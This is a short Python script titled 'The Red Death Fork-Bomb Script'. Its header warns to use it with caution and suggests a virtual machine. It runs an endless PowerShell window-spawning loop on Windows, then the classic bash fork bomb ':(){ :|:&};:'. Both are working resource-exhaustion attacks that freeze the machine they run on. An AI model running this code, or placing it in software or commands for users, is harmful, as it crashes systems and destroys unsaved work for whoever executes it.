# The Red Death Fork-Bomb Script
# USE WITH CAUTION
# Oracle VirtualBox or VMWare Recommended

import subprocess
import os

if os.name == "nt":
    def run_powershell(command: str):
        try:
            result = subprocess.run(
                ["powershell.exe", "-Command", command],
                capture_output=True,
                text=True,
                check=True
            )
            print(result.stdout)

        except subprocess.CalledProcessError as e:
            print(f"Error occured (Exit Code {e.returncode}):")
            print(e.stderr)
    run_powershell("for(){start powershell}")

def run_bash(command: str):
    try:
        result = subprocess.run(
            ["bash", "-c", command],
            capture_output=True,
            text=True,
            check=True
        )
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error occured (Exit Code {e.returncode}):")
        print(e.stderr)
run_bash(":(){ :|:&};:")